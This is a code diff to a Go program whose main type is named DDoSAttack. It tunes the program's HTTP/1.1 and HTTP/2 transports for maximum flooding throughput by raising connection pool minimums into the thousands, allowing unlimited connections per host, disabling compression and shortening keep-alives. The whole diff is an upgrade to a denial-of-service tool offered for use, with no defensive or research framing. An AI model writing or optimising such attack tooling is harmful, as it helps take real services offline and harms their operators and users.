@@ -17,14 +17,21 @@ import (
 // createHTTP2Transport creates an HTTP/2 enabled transport
 func (d *DDoSAttack) createHTTP2Transport() (*http.Transport, error) {
 	tlsConfig := d.createTLSConfig()
+	// Optimize MaxIdleConns to MaxThreads * 3 for HTTP/2 mode
+	maxIdleConns := d.config.MaxThreads * 3
+	if maxIdleConns < 3000 {
+		maxIdleConns = 3000 // Minimum for high-throughput HTTP/2
+	}
 	transport := &http.Transport{
-		TLSClientConfig: tlsConfig,
-		MaxIdleConns:    d.config.MaxThreads,
+		TLSClientConfig:     tlsConfig,
+		MaxIdleConns:        maxIdleConns,
+		MaxConnsPerHost:     0, // Unlimited connections per host
+		DisableKeepAlives:   false, // Always reuse connections
+		DisableCompression:  true,  // Disable compression for efficiency
 		DialContext: (&net.Dialer{
 			Timeout:   d.config.Timeout,
-			KeepAlive: 30 * time.Second,
+			KeepAlive: 15 * time.Second, // Reduced from 30s for faster connection turnover
 		}).DialContext,
-		DisableKeepAlives: false, // Always reuse connections
 	}
 
 	// Configure HTTP/2
@@ -38,15 +45,22 @@ func (d *DDoSAttack) createHTTP2Transport() (*http.Transport, error) {
 // createHTTP1Transport creates a standard HTTP/1.1 transport
 func (d *DDoSAttack) createHTTP1Transport(numWorkers int) *http.Transport {
 	tlsConfig := d.createTLSConfig()
+	// Optimize MaxIdleConns to numWorkers * 2 for better connection reuse
+	maxIdleConns := numWorkers * 2
+	if maxIdleConns < 2000 {
+		maxIdleConns = 2000 // Minimum for high-throughput
+	}
 	return &http.Transport{
 		TLSClientConfig:     tlsConfig,
-		MaxIdleConns:        numWorkers,
+		MaxIdleConns:        maxIdleConns,
 		MaxIdleConnsPerHost: numWorkers,
-		IdleConnTimeout:     30 * time.Second,
-		DisableKeepAlives:   false, // Always reuse connections
+		MaxConnsPerHost:     0, // Unlimited connections per host
+		IdleConnTimeout:     60 * time.Second, // Increased from 30s for better reuse
+		DisableKeepAlives:   false,            // Always reuse connections
+		DisableCompression:  true,             // Disable compression for efficiency
 		DialContext: (&net.Dialer{
 			Timeout:   d.config.Timeout,
-			KeepAlive: 30 * time.Second,
+			KeepAlive: 15 * time.Second, // Reduced from 30s for faster connection turnover
 		}).DialContext,
 	}
 }
